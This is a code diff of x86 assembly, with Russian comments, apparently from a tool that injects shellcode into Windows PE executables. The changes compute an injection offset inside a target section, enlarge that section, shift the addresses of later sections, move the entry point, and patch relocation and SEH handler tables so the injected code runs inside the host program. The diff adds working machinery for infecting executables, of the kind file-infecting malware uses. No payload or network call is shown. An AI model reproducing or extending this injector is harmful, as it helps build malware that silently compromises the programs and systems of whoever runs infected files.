@@ -333,7 +333,9 @@ INJECTION_SIGN 	equ 050h
 
     mov cdx, cax
     mov [targetSection], cdx
-    mov ccx, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
+    xor ccx, ccx
+    mov ecx, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
+    mov [cbx + scInfo.SizeOfTargetSec], ecx
     add ccx, [codeSize]
     mov [newCSSize], ccx
     ; _diff = Aligment(vsize, _aligm) - Aligment(_psects[num].Misc.VirtualSize, _aligm);
@@ -342,19 +344,27 @@ INJECTION_SIGN 	equ 050h
     invoke AlignToTop, [newCSSize], [secAligm]
     sub eax, [dwTmp]
     mov [sAlignAddSize], eax
+    mov dword ptr [cbx + scInfo.v_diff], eax
+
     ; f_diff = Aligment(vsize, f_aligm) - Aligment(_psects[num].Misc.VirtualSize, f_aligm);
     invoke AlignToTop, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, [fileAligment]
     mov [dwTmp], eax
     invoke AlignToTop, [newCSSize], [fileAligment]
     sub eax, [dwTmp]
     mov [fAlignAddSize], eax
+    mov dword ptr [cbx + scInfo.f_diff], eax
 
-    mov eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
+    ; invoke sc_printf, addr [cbx + strFormatInt], [fAlignAddSize]
+    ; invoke sc_printf, addr [cbx + strFormatInt], [sAlignAddSize]
+
+    xor eax, eax
+    ;mov eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
     add eax, [cdx].IMAGE_SECTION_HEADER.VirtualAddress
     mov [VAsc], eax
+    mov dword ptr [cbx + scInfo.startRVA], eax
 
     mov eax, [cdx].IMAGE_SECTION_HEADER.PointerToRawData
-    add eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
+    ;add eax, [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize
     mov [RawAddrSc], eax
 
     .if [VAsc] == 0
@@ -362,6 +372,8 @@ INJECTION_SIGN 	equ 050h
         xor cax, cax
         ret
     .endif
+
+    mov dword ptr [cbx + scInfo.scSize], totalEnd - start
 
     ;DbgBreak
     ; mov eax, [VAsc]
@@ -424,19 +436,24 @@ INJECTION_SIGN 	equ 050h
     mov ccx, [targetSection]
 
     ; dst = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData + RawScSize;
-    mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
-    add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
-    add edx, [fAlignAddSize]
-    add cdi, cdx
-
-    ; src = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData
-    mov cdx, [pe]
-    mov csi, [cdx].PeHeaders.mem
-    mov ccx, [targetSection]
-    mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
-    add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
+    ;mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
+    ;add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
+    ;add edx, [fAlignAddSize]
+    ;add cdi, cdx
+    mov cdi, [pSC]
+    add cdi, [fAlignAddSize]
+    ;add cdi, [fAlignAddSize]
     
-    add csi, cdx
+    ; src = pe.mem + targetSection->PointerToRawData + targetSection->SizeOfRawData
+    ; mov cdx, [pe]
+    ; mov csi, [cdx].PeHeaders.mem
+    ; mov ccx, [targetSection]
+    ; mov edx, [ccx].IMAGE_SECTION_HEADER.PointerToRawData 
+    ; add edx, [ccx].IMAGE_SECTION_HEADER.SizeOfRawData
+    ; add csi, cdx
+    mov csi, [pSC]
+    ;add csi, totalEnd - start
+
     mov ccx, [peMem]
     add ccx, [oldFileSize] ; ccx = pe->mem + pe->filesize
     sub ccx, csi    ; ccx = ccx - src = sizeMovedData
@@ -455,6 +472,13 @@ INJECTION_SIGN 	equ 050h
      ; секции
     mov cdi, [pe]
     mov csi, [cdi].PeHeaders.sections
+    mov ccx, [cdi].PeHeaders.nthead
+    lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
+    mov edx, [VAsc]
+    .if [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint >= edx
+        mov edx, [fAlignAddSize]
+        add [ccx].IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint, edx 
+    .endif
     xor ccx, ccx
     xor cax, cax
 
@@ -464,7 +488,7 @@ INJECTION_SIGN 	equ 050h
     .while ecx < [countSec]
         ;DbgBreak
         mov ecx, [VAsc]
-        .if ([csi].IMAGE_SECTION_HEADER.VirtualAddress >= ecx)
+        .if ([csi].IMAGE_SECTION_HEADER.VirtualAddress > ecx)
             mov eax, dword ptr [sAlignAddSize]
             add [csi].IMAGE_SECTION_HEADER.VirtualAddress, eax
             .if [csi].IMAGE_SECTION_HEADER.PointerToRawData != 0
@@ -478,6 +502,7 @@ INJECTION_SIGN 	equ 050h
         inc [i]
         mov ecx, [i]
     .endw
+    
     
     
     ; точка вход
@@ -746,7 +771,7 @@ HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT
         xor ecx, ecx
         mov [i], ccx
         .while ccx < [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerCount
-            mov ecx, [allignScSize]
+            mov ecx, [scSize]
             .if [cax] >= cdx
                 add [cax], ccx
             .endif
@@ -762,6 +787,7 @@ HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT
     ret
 HandleLoadConfTable endp
 
+; TODO Для первой секции прибавлять другое значение
 HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, scRVA:dword, allignScSize:dword
 
     local pBlocks:cword
@@ -792,8 +818,6 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
         lea csi, [cdi + sizeof(IMAGE_BASE_RELOCATION)]
         mov [pBlocks], csi
         
-        
-
         xor cdx, cdx
         mov ccx, [pBlocks]
         .while word ptr [ccx] != 0
@@ -809,7 +833,8 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
             .if cword ptr [csi] >= cdx
                 xor cax, cax
                 ;mov cdx, cax
-                mov edx, [allignScSize]
+                ;.if [cdi].IMAGE_BASE_RELOCATION.VirtualAddress >
+                mov edx, dword ptr [cbx + scInfo.v_diff]
                 add cword ptr [csi], cdx
             .endif
             add ccx, 2
